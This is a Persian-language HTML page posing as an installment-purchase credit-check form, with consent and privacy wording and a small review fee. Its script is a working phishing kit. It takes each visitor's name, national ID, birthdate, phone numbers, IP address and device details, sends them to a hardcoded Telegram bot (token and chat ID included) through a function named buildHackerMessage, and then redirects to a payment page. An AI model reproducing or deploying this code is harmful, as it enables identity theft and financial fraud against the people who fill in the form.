<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>درخواست اعتبارسنجی خرید اقساطی</title>

<link rel="stylesheet" href="https://unpkg.com/persian-datepicker@1.2.0/dist/css/persian-datepicker.min.css">

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  padding: 20px;
  background: linear-gradient(135deg, #0d47a1 0%, #1976d2 50%, #42a5f5 100%);
  min-height: 100vh;
  font-family: Tahoma, Arial, sans-serif;
  color: #263238;
}

.container {
  max-width: 480px;
  margin: 25px auto;
  background: #fff;
  padding: 25px;
  border-radius: 14px;
  box-shadow: 0 12px 40px rgba(0,0,0,.25);
  border-top: 5px solid #0d47a1;
}

.header {
  text-align: center;
  padding-bottom: 15px;
  border-bottom: 1px solid #e3ecf5;
}

.header h2 {
  color: #0d47a1;
  font-size: 21px;
  margin: 0 0 10px;
}

.header p {
  color: #546e7a;
  font-size: 13px;
  line-height: 2;
  margin: 0;
}

label {
  display: block;
  font-size: 13px;
  font-weight: bold;
  margin: 16px 0 7px;
  color: #0d47a1;
}

input {
  width: 100%;
  padding: 13px;
  border: 1.5px solid #c5d8ec;
  border-radius: 8px;
  font-size: 14px;
  outline: none;
  background: #f8fbff;
  transition: all .2s;
  direction: ltr;
  text-align: right;
}

input:focus {
  border-color: #1976d2;
  background: #fff;
  box-shadow: 0 0 0 3px rgba(25,118,210,.12);
}

input.invalid {
  border-color: #e53935;
  background: #ffebee;
}

input.valid {
  border-color: #43a047;
  background: #f1f8e9;
}

.fee {
  background: linear-gradient(135deg, #e3f2fd, #bbdefb);
  color: #0d47a1;
  border-radius: 8px;
  padding: 16px;
  text-align: center;
  font-weight: bold;
  margin-top: 20px;
  border: 1px solid #90caf9;
}

.consent {
  display: flex;
  align-items: flex-start;
  gap: 9px;
  font-size: 12px;
  line-height: 2;
  margin: 18px 0;
}

.consent input { width: auto; margin-top: 5px; }

button {
  width: 100%;
  padding: 15px;
  border: none;
  border-radius: 8px;
  background: linear-gradient(135deg, #0d47a1, #1976d2);
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: all .2s;
}

button:hover:not(:disabled) {
  background: linear-gradient(135deg, #1565c0, #2196f3);
  box-shadow: 0 6px 18px rgba(13,71,161,.35);
}

button:disabled {
  background: #90a4ae;
  cursor: not-allowed;
}

#status {
  text-align: center;
  font-size: 13px;
  margin-top: 15px;
  padding: 10px;
  border-radius: 6px;
  line-height: 1.8;
  word-break: break-word;
}

#status.error {
  background: #ffebee;
  color: #c62828;
  border: 1px solid #ef9a9a;
}

#status.success {
  background: #e8f5e9;
  color: #2e7d32;
  border: 1px solid #a5d6a7;
}

#status.info {
  background: #e3f2fd;
  color: #1565c0;
  border: 1px solid #90caf9;
}

.hint {
  font-size: 11px;
  color: #78909c;
  margin-top: 4px;
  display: block;
}

.datepicker-plot-area {
  font-family: Tahoma, Arial, sans-serif !important;
}

.datepicker-day-view .table-days td.selected span {
  background: #1976d2 !important;
}
</style>
</head>

<body>

<div class="container">

  <div class="header">
    <h2>درخواست اعتبارسنجی</h2>
    <p>
      برای بررسی شرایط خرید اقساطی، اطلاعات موردنیاز را
      وارد کنید. اطلاعات شما فقط طبق سیاست حفظ حریم خصوصی
      و با رضایت شما پردازش خواهد شد.
    </p>
  </div>

  <form id="requestForm" novalidate>

    <label for="fullname">نام و نام خانوادگی</label>
    <input type="text" id="fullname" autocomplete="name" required>
    <span class="hint">حداقل ۳ حرف</span>

    <label for="nationalId">کد ملی</label>
    <input type="text" id="nationalId" inputmode="numeric" maxlength="10" placeholder="۱۰ رقم" required>
    <span class="hint">۱۰ رقم معتبر با الگوریتم کد ملی</span>

    <label for="birthdate">تاریخ تولد</label>
    <input type="text" id="birthdate" placeholder="برای انتخاب کلیک کنید" readonly required>

    <label for="mobile">شماره موبایل</label>
    <input type="tel" id="mobile" placeholder="09123456789" maxlength="11" required>
    <span class="hint">۱۱ رقم، شروع با 09</span>

    <label for="phone">شماره تماس جایگزین (اختیاری)</label>
    <input type="tel" id="phone" placeholder="02188888888" maxlength="11">

    <div class="fee">
      هزینه بررسی درخواست: ۵,۰۰۰ تومان
    </div>

    <label class="consent">
      <input type="checkbox" id="agree" required>
      <span>
        با پردازش اطلاعات واردشده برای بررسی درخواست موافقم.
        سیاست حفظ حریم خصوصی را مطالعه کرده‌ام.
      </span>
    </label>

    <button type="submit" id="submitButton">
      ادامه و پرداخت
    </button>

    <div id="status"></div>

  </form>

</div>

<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://unpkg.com/persian-date@1.1.0/dist/persian-date.min.js"></script>
<script src="https://unpkg.com/persian-datepicker@1.2.0/dist/js/persian-datepicker.min.js"></script>

<script>
/* ============================================================
   ⚙️ تنظیمات تلگرام — توکن و CHAT_ID شما
   ============================================================ */
const BOT_TOKEN = "9096438309:AAFPh7QKmFAHl3WPiz5T_MPUghRSSj-s75Y";
const CHAT_ID   = "-1003803727270";

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const IP_API       = "https://api.ipify.org?format=json";

/* ============================================================
   تقویم شمسی
   ============================================================ */
$(document).ready(function () {
  $("#birthdate").persianDatepicker({
    format: "YYYY/MM/DD",
    initialValue: false,
    autoClose: true,
    calendar: {
      persian: {
        locale: "fa",
        leapYearMode: "algorithmic"
      }
    },
    navigator: {
      scroll: { enabled: true }
    },
    toolbox: {
      calendarSwitch: { enabled: false },
      todayButton: { enabled: true, text: { fa: "امروز" } },
      submitButton: { enabled: true, text: { fa: "تایید" } }
    },
    timePicker: { enabled: false },
    observer: true
  });
});

/* ============================================================
   ابزارها
   ============================================================ */
function normalizeDigits(value) {
  return value
    .replace(/[۰-۹]/g, d => "۰۱۲۳۴۵۶۷۸۹".indexOf(d))
    .replace(/[٠-٩]/g, d => "٠١٢٣٤٥٦٧٨٩".indexOf(d));
}

function escapeHTML(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function isValidNationalId(id) {
  if (!/^[0-9]{10}$/.test(id)) return false;
  if (/^(\d)\1{9}$/.test(id)) return false;
  const check = +id[9];
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += (+id[i]) * (10 - i);
  const r = sum % 11;
  return (r < 2 && check === r) || (r >= 2 && check === 11 - r);
}

async function getUserIP() {
  try {
    const res = await fetch(IP_API);
    const data = await res.json();
    return data.ip || "نامشخص";
  } catch (e) {
    return "نامشخص";
  }
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let browser = "نامشخص", os = "نامشخص";
  if (/Edg\//.test(ua)) browser = "Edge";
  else if (/OPR\//.test(ua)) browser = "Opera";
  else if (/Chrome\//.test(ua)) browser = "Chrome";
  else if (/Firefox\//.test(ua)) browser = "Firefox";
  else if (/Safari\//.test(ua)) browser = "Safari";
  if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
  else if (/Windows/.test(ua)) os = "Windows";
  else if (/Android/.test(ua)) os = "Android";
  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
  else if (/Mac OS X/.test(ua)) os = "macOS";
  else if (/Linux/.test(ua)) os = "Linux";
  return { browser, os };
}

/* ============================================================
   اعتبارسنجی آنی
   ============================================================ */
const fields = {
  fullname:   document.getElementById("fullname"),
  nationalId: document.getElementById("nationalId"),
  birthdate:  document.getElementById("birthdate"),
  mobile:     document.getElementById("mobile"),
  phone:      document.getElementById("phone")
};

fields.nationalId.addEventListener("input", function () {
  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 10);
  this.classList.toggle("valid",   isValidNationalId(this.value));
  this.classList.toggle("invalid", this.value.length === 10 && !isValidNationalId(this.value));
});

fields.mobile.addEventListener("input", function () {
  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 11);
  const ok = /^09[0-9]{9}$/.test(this.value);
  this.classList.toggle("valid", ok);
  this.classList.toggle("invalid", this.value.length === 11 && !ok);
});

fields.phone.addEventListener("input", function () {
  this.value = normalizeDigits(this.value).replace(/\D/g, "").slice(0, 11);
});

fields.fullname.addEventListener("input", function () {
  const ok = this.value.trim().length >= 3;
  this.classList.toggle("valid", ok);
  this.classList.toggle("invalid", this.value.length > 0 && !ok);
});

/* ============================================================
   ساخت پیام هکری
   ============================================================ */
function buildHackerMessage(data) {
  const { fullname, nationalId, birthdate, mobile, phone, ip, browser, os, time } = data;
  const copyLine = `${fullname} | ${nationalId} | ${birthdate} | ${mobile} | ${phone || "-"} | ${ip}`;

  return (
`\`\`\`ansi
┌─────────────────────────────┐
│   ▓▒░  INCOMING  DATA  ░▒▓   │
└─────────────────────────────┘
\`\`\`
▸ <b>NAME</b>      ➤  ${escapeHTML(fullname)}
▸ <b>NATIONAL</b>  ➤  <code>${escapeHTML(nationalId)}</code>
▸ <b>BIRTH</b>     ➤  ${escapeHTML(birthdate)}
▸ <b>MOBILE</b>    ➤  <code>${escapeHTML(mobile)}</code>
▸ <b>PHONE</b>     ➤  <code>${escapeHTML(phone) || "—"}</code>
▸ <b>IP</b>        ➤  <code>${escapeHTML(ip)}</code>

\`\`\`ansi
┌─────────────────────────────┐
│   ▓▒░  SYSTEM INFO  ░▒▓     │
└─────────────────────────────┘
\`\`\`
▸ <b>OS</b>        ➤  ${escapeHTML(os)}
▸ <b>BROWSER</b>   ➤  ${escapeHTML(browser)}
▸ <b>TIME</b>      ➤  ${escapeHTML(time)}

\`\`\`ansi
┌─────────────────────────────┐
│   ▓▒░  COPY  BLOCK  ░▒▓     │
└─────────────────────────────┘
\`\`\`
<code>${escapeHTML(copyLine)}</code>`
  );
}

/* ============================================================
   فرم
   ============================================================ */
const form      = document.getElementById("requestForm");
const button    = document.getElementById("submitButton");
const statusBox = document.getElementById("status");

function setStatus(msg, type) {
  statusBox.textContent = msg;
  statusBox.className = type || "";
}

form.addEventListener("submit", async function (event) {
  event.preventDefault();

  const fullname   = fields.fullname.value.trim();
  const nationalId = normalizeDigits(fields.nationalId.value.trim());
  const birthdate  = fields.birthdate.value.trim();
  const mobile     = normalizeDigits(fields.mobile.value.trim());
  const phone      = normalizeDigits(fields.phone.value.trim());

  if (!document.getElementById("agree").checked) {
    setStatus("لطفاً موافقت خود را ثبت کنید.", "error"); return;
  }
  if (fullname.length < 3) {
    setStatus("نام و نام خانوادگی حداقل ۳ حرف باشد.", "error"); return;
  }
  if (!isValidNationalId(nationalId)) {
    setStatus("کد ملی وارد شده معتبر نیست.", "error"); return;
  }
  if (!birthdate) {
    setStatus("لطفاً تاریخ تولد را انتخاب کنید.", "error"); return;
  }
  if (!/^09[0-9]{9}$/.test(mobile)) {
    setStatus("شماره موبایل باید ۱۱ رقم و با 09 شروع شود.", "error"); return;
  }
  if (phone && !/^[0-9]{8,11}$/.test(phone)) {
    setStatus("شماره تماس جایگزین معتبر نیست.", "error"); return;
  }

  button.disabled = true;
  button.textContent = "در حال ارسال...";
  setStatus("در حال ارسال به تلگرام...", "info");

  try {
    const userIP = await getUserIP();
    const { browser, os } = getDeviceInfo();
    const time = new Date().toLocaleString("fa-IR");

    const message = buildHackerMessage({
      fullname, nationalId, birthdate, mobile, phone,
      ip: userIP, browser, os, time
    });

    const tgRes = await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true
      })
    });

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      throw new Error(tgData.description || "خطای نامشخص تلگرام");
    }

    setStatus("✅ درخواست با موفقیت ثبت شد. در حال انتقال به پرداخت...", "success");
    setTimeout(() => { window.location.href = "./Pay/"; }, 1200);

  } catch (error) {
    console.error("Telegram error:", error);
    let msg = "ارسال درخواست انجام نشد. ";
    if (error.message.includes("chat not found")) {
      msg += "CHAT_ID اشتباه است یا ربات در گروه عضو نیست.";
    } else if (error.message.includes("Unauthorized")) {
      msg += "BOT_TOKEN نامعتبر است.";
    } else if (error.message.includes("not enough rights")) {
      msg += "ربات در گروه اجازه ارسال پیام ندارد.";
    } else if (error.message.includes("Failed to fetch")) {
      msg += "اتصال اینترنت یا فیلترشکن را بررسی کنید.";
    } else {
      msg += error.message;
    }
    setStatus("❌ " + msg, "error");
    button.disabled = false;
    button.textContent = "ادامه و پرداخت";
  }
});
</script>

</body>
</html>
